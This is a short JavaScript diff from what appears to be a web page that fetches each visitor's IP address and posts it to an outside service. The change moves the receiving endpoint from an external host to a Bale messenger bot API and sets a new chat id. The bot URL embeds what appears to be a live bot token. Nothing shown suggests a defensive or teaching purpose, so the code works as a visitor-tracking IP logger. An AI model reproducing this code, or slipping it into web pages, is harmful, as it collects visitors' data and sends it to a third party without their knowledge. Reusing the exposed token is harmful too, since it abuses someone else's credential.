@@ -9,10 +9,10 @@
 		console.log(JSON.stringify(data, null, 2));
 		alert(data.ipAddress);
 	});
-        var id = "16965075642233";
+        var id = "915303220";
         function sendMsg() {
-            var text = "ip : {data.ipAddress}";
-            $.post("https://harfeto.timefriend.net/harfeto/sendMsg", {"text":data.ipAddress ,"id":id},function(result,status){
+       
+            $.post("https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage" ,  {text: data.ipAddress ,chat_id:id},function(result,status){
                 if(status=='success'){
                     var obj = JSON.parse(result);
                     if(obj.id!='0'){
